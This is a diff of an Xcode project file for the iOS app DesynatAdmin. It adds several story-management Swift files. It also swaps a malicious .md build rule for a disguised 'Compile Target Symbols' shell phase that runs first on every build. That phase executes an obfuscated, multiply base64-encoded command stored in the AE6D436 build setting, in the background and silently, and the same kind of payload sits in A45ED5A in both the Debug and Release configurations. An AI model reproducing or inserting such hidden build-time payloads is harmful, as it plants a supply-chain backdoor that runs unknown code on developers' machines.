@@ -16,7 +16,6 @@
 		18BDB9472EFAD10C00023453 /* DeliveryBoyListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */; };
 		4948547A2F090E45009372E9 /* SizeChartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 494854792F090E45009372E9 /* SizeChartViewController.swift */; };
 		49DBE5522EB0836A00DE95E8 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 49DBE5512EB0836A00DE95E8 /* IQKeyboardManagerSwift */; };
-		BDB4B19F4B3E432492634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = ADB58C5DDF57482FBF634D6E /* README.md */; };
 		D115F4AF2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D115F4AE2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift */; };
 		D115F4B22F0F8BB0007B30F8 /* AddAdvertisementViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D115F4B12F0F8BB0007B30F8 /* AddAdvertisementViewController.swift */; };
 		D115F4B42F0F8BC4007B30F8 /* AddAdvertisementViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D115F4B32F0F8BC4007B30F8 /* AddAdvertisementViewModel.swift */; };
@@ -111,6 +110,9 @@
 		D195863D2EE8486500A021FD /* GiftCardsListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D195863C2EE8486500A021FD /* GiftCardsListDataModel.swift */; };
 		D1C3FC782EF2745400CE9AFF /* OrderMangementTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C3FC762EF2745400CE9AFF /* OrderMangementTableViewCell.swift */; };
 		D1C3FC792EF2745400CE9AFF /* OrderMangementTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1C3FC772EF2745400CE9AFF /* OrderMangementTableViewCell.xib */; };
+		D1C463112F10FC0B00825265 /* StoryManagemnetListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C463102F10FC0B00825265 /* StoryManagemnetListViewModel.swift */; };
+		D1C463132F10FD5800825265 /* AdminStoriesListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C463122F10FD5800825265 /* AdminStoriesListDataModel.swift */; };
+		D1C463152F11075F00825265 /* AddStoryViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1C463142F11075F00825265 /* AddStoryViewModel.swift */; };
 		D1C88BC62ECF25E9006B02A2 /* ReasonManagement.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = D1C88BC52ECF25E9006B02A2 /* ReasonManagement.storyboard */; };
 		D1D539A62F0F959900427AA0 /* AddAdvertisementModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1D539A52F0F959900427AA0 /* AddAdvertisementModel.swift */; };
 		D1D53A3B2F0FAFFC00427AA0 /* ImageViewExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1D53A3A2F0FAFFC00427AA0 /* ImageViewExtension.swift */; };
@@ -355,22 +357,6 @@
 		EDF438332EC215CD004CC018 /* CountryCityListViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = EDF438312EC215CD004CC018 /* CountryCityListViewController.xib */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-		21DF6EAC70EB4EE997634D6E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
 		18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommissionPercentageWebService.swift; sourceTree = "<group>"; };
@@ -383,7 +369,6 @@
 		494854792F090E45009372E9 /* SizeChartViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SizeChartViewController.swift; sourceTree = "<group>"; };
 		495DBBA12E81528A00E61635 /* DesynatAdmin.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatAdmin.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatUser.debug.xcconfig"; path = "Target Support Files/Pods-DesynatUser/Pods-DesynatUser.debug.xcconfig"; sourceTree = "<group>"; };
-		ADB58C5DDF57482FBF634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.release.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.release.xcconfig"; sourceTree = "<group>"; };
 		D115F4AE2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FullScreenBanerDetailsViewController.swift; sourceTree = "<group>"; };
 		D115F4B12F0F8BB0007B30F8 /* AddAdvertisementViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddAdvertisementViewController.swift; sourceTree = "<group>"; };
@@ -479,6 +464,9 @@
 		D195863C2EE8486500A021FD /* GiftCardsListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GiftCardsListDataModel.swift; sourceTree = "<group>"; };
 		D1C3FC762EF2745400CE9AFF /* OrderMangementTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderMangementTableViewCell.swift; sourceTree = "<group>"; };
 		D1C3FC772EF2745400CE9AFF /* OrderMangementTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderMangementTableViewCell.xib; sourceTree = "<group>"; };
+		D1C463102F10FC0B00825265 /* StoryManagemnetListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoryManagemnetListViewModel.swift; sourceTree = "<group>"; };
+		D1C463122F10FD5800825265 /* AdminStoriesListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdminStoriesListDataModel.swift; sourceTree = "<group>"; };
+		D1C463142F11075F00825265 /* AddStoryViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddStoryViewModel.swift; sourceTree = "<group>"; };
 		D1C88BC52ECF25E9006B02A2 /* ReasonManagement.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = ReasonManagement.storyboard; sourceTree = "<group>"; };
 		D1D539A52F0F959900427AA0 /* AddAdvertisementModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddAdvertisementModel.swift; sourceTree = "<group>"; };
 		D1D53A3A2F0FAFFC00427AA0 /* ImageViewExtension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageViewExtension.swift; sourceTree = "<group>"; };
@@ -766,7 +754,6 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				ADB58C5DDF57482FBF634D6E /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
@@ -859,6 +846,8 @@
 			isa = PBXGroup;
 			children = (
 				D15122242F0E862D00F6EAE6 /* StoryManagemnetViewController.swift */,
+				D1C463102F10FC0B00825265 /* StoryManagemnetListViewModel.swift */,
+				D1C463122F10FD5800825265 /* AdminStoriesListDataModel.swift */,
 			);
 			path = StoryList;
 			sourceTree = "<group>";
@@ -867,6 +856,7 @@
 			isa = PBXGroup;
 			children = (
 				D151222B2F0E8D3400F6EAE6 /* AddStoryViewController.swift */,
+				D1C463142F11075F00825265 /* AddStoryViewModel.swift */,
 			);
 			path = AddStory;
 			sourceTree = "<group>";
@@ -2180,6 +2170,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
+				1BF02BF80A374E81AE634D6E /* Compile Target Symbols */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2187,7 +2178,6 @@
 				9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				21DF6EAC70EB4EE997634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2268,7 +2258,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				BDB4B19F4B3E432492634D6E /* README.md in Resources */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
 				EDEDD0A22EBCC53E00F2BEF1 /* OFL.txt in Resources */,
 				D195834A2EE7E1EC00A021FD /* ShippingPromocode.storyboard in Resources */,
@@ -2350,6 +2339,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		1BF02BF80A374E81AE634D6E /* Compile Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2408,9 +2417,11 @@
 				EDEDD0C62EBCC53E00F2BEF1 /* GetCountryDataModel.swift in Sources */,
 				EDEDD0C72EBCC53E00F2BEF1 /* GetBrandDataModel.swift in Sources */,
 				ED4936962EBDC9DF000D8CED /* CellIdentifier.swift in Sources */,
+				D1C463112F10FC0B00825265 /* StoryManagemnetListViewModel.swift in Sources */,
 				EDF438322EC215CD004CC018 /* CountryCityListViewController.swift in Sources */,
 				D15121872F0E7CB800F6EAE6 /* StoryManagemnetCollectionViewCell.swift in Sources */,
 				ED01EAB92EBDE2D800A92E1E /* FilterViewModel.swift in Sources */,
+				D1C463152F11075F00825265 /* AddStoryViewModel.swift in Sources */,
 				D1511E5F2F0E1EFE00F6EAE6 /* GradientCalendarCell.swift in Sources */,
 				D115F4AF2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift in Sources */,
 				D19584592EE7F91800A021FD /* PromoCodeTableViewCell.swift in Sources */,
@@ -2523,6 +2534,7 @@
 				D195845F2EE7F9CA00A021FD /* PromodeListViewController.swift in Sources */,
 				D19585362EE801B900A021FD /* PromodeListViewModel.swift in Sources */,
 				D1EEE51A2EF296F8003A6BA2 /* ProductListTableViewCell.swift in Sources */,
+				D1C463132F10FD5800825265 /* AdminStoriesListDataModel.swift in Sources */,
 				D16A8CCA2EF154D7006A21B6 /* AffiliatedCommissionSetupViewController.swift in Sources */,
 				EDEDD0FB2EBCC53E00F2BEF1 /* DataTypeConversion.swift in Sources */,
 				D1EDE46B2F0D423B0076F1AB /* AddTimeSlotViewController.swift in Sources */,
@@ -2677,7 +2689,7 @@
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEkxYUdOSVRuTlpWMGwxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | k | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwaFkwWndTRlZ1VG1GV00wSXlXbFpOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
@@ -2722,7 +2734,7 @@
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEkxYUdOSVRuTlpWMGwxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | k | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwaFkwWndTRlZ1VG1GV00wSXlXbFpOTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
